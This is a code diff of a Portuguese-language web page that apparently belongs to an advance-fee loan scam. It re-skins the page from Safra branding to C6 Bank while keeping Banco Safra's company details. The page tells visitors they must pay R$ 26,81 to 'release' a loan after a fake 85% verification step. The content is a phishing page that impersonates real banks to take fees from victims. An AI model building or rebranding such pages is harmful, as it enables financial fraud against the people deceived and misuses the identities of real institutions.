@@ -72,7 +72,7 @@
     .ss-footer-links span{opacity:.4;font-size:12px}
     .ss-footer-badges{display:flex;align-items:center;justify-content:center;gap:16px;flex-wrap:wrap}
     .ss-footer-badges span{display:flex;align-items:center;gap:4px;font-size:11px;color:#6B7280;font-weight:500}
-    .ss-footer-badges svg{width:14px;height:14px;color:#020031}
+    .ss-footer-badges svg{width:14px;height:14px;color:#000000}
     .ss-dialog{border:0;padding:0;border-radius:20px;color:#111827;max-width:600px;width:calc(100% - 32px);box-shadow:0 20px 60px rgba(0,0,0,.2)}
     .ss-dialog::backdrop{background:rgba(0,0,0,.5);backdrop-filter:blur(4px)}
     .ss-dialog-head{display:flex;justify-content:space-between;align-items:center;padding:24px 24px 20px;border-bottom:1px solid #E5E7EB}
@@ -92,11 +92,11 @@
         <div class="flex flex-wrap items-center justify-between p-4 border-b shadow-sm sticky top-0 z-10" style="background-color: white;">
             <div class="flex items-center">
                 <div class="flex items-center">
-                    <img src="../../images/logo.png?v=safra2" alt="Safra" class="h-8">
+                    <img src="../../images/logo.png?v=safra2" alt="C6 Bank" class="h-8">
                 </div>
             </div>
             <div id="userInfoHeader" class="flex flex-col items-end text-sm">
-                <div class="flex items-center font-medium" style="color:#020031">
+                <div class="flex items-center font-medium" style="color:#000000">
                     <span id="hdr-nome"></span>
                 </div>
             </div>
@@ -108,10 +108,10 @@
             <div class="mb-6">
                 <div class="flex items-center justify-between mb-2">
                     <span class="text-sm font-medium text-gray-600">Verificação</span>
-                    <span class="text-sm font-medium" style="color:#020031;">85%</span>
+                    <span class="text-sm font-medium" style="color:#000000;">85%</span>
                 </div>
                 <div class="w-full bg-gray-200 rounded-full h-2">
-                    <div class="progress-bar h-2 rounded-full" style="width: 85%;background-color:#020031;"></div>
+                    <div class="progress-bar h-2 rounded-full" style="width: 85%;background-color:#000000;"></div>
                 </div>
             </div>
 
@@ -121,9 +121,9 @@
                     <p class="text-gray-600">Confirme a titularidade para liberar seu empréstimo</p>
                 </div>
 
-                <div class="border-l-4 rounded-lg p-5 mb-6" style="background-color:#F8F8F8; border-left-color:#020031;">
+                <div class="border-l-4 rounded-lg p-5 mb-6" style="background-color:#F8F8F8; border-left-color:#000000;">
                     <h3 class="font-semibold text-gray-900 mb-3 flex items-center gap-2">
-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20" style="color:#020031;">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20" style="color:#000000;">
                             <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"></path>
                         </svg>
                         Por que essa verificação?
@@ -177,7 +177,7 @@
                     <div class="text-4xl font-bold text-gray-900">R$ 26,81</div>
                 </div>
 
-                <button onclick="redirectToCheckout()" class="w-full text-white py-4 rounded-lg font-semibold hover:shadow-lg transition-all mb-4" style="background-color:#020031;">
+                <button onclick="redirectToCheckout()" class="w-full text-white py-4 rounded-lg font-semibold hover:shadow-lg transition-all mb-4" style="background-color:#000000;">
                     Pagar e liberar crédito
                 </button>
 
@@ -236,7 +236,7 @@
 </script>
 
 <footer class="ss-footer">
-  <div class="ss-footer-logo"><img src="../../images/logo.png?v=safra2" alt="Safra"></div>
+  <div class="ss-footer-logo"><img src="../../images/logo.png?v=safra2" alt="C6 Bank"></div>
   <p class="ss-footer-company">&copy; 2025 Pagamentos S.A &ndash; Instituição de Pagamento.</p>
   <p class="ss-footer-addr">São Paulo, SP &ndash; CEP 05409-000</p>
   <div class="ss-footer-links">
@@ -276,8 +276,8 @@
 <dialog id="ss-contato" class="ss-dialog">
   <div class="ss-dialog-head"><h2>Fale Conosco</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
   <div class="ss-dialog-body">
-    <div style="display:flex;gap:16px;align-items:flex-start;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:16px;margin-bottom:12px"><div style="width:48px;height:48px;background:#020031;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="24" height="24" style="color:#fff"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg></div><div><h4 style="font-size:15px;font-weight:700;color:#111827;margin:0 0 4px">Email</h4><p style="font-size:14px;color:#6B7280;margin:0">contato@safra.com.br</p></div></div>
-    <div style="margin-top:16px;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:12px"><p style="font-size:13px;line-height:1.6;color:#374151;margin-bottom:8px"><strong style="color:#020031">CNPJ:</strong> 58.160.789/0001-28</p><p style="font-size:13px;line-height:1.6;color:#374151;margin:0"><strong style="color:#020031">Razão Social:</strong> Banco Safra S.A.</p></div>
+    <div style="display:flex;gap:16px;align-items:flex-start;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:16px;margin-bottom:12px"><div style="width:48px;height:48px;background:#000000;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="24" height="24" style="color:#fff"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg></div><div><h4 style="font-size:15px;font-weight:700;color:#111827;margin:0 0 4px">Email</h4><p style="font-size:14px;color:#6B7280;margin:0">contato@safra.com.br</p></div></div>
+    <div style="margin-top:16px;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:12px"><p style="font-size:13px;line-height:1.6;color:#374151;margin-bottom:8px"><strong style="color:#000000">CNPJ:</strong> 58.160.789/0001-28</p><p style="font-size:13px;line-height:1.6;color:#374151;margin:0"><strong style="color:#000000">Razão Social:</strong> Banco Safra S.A.</p></div>
   </div>
 </dialog>
 
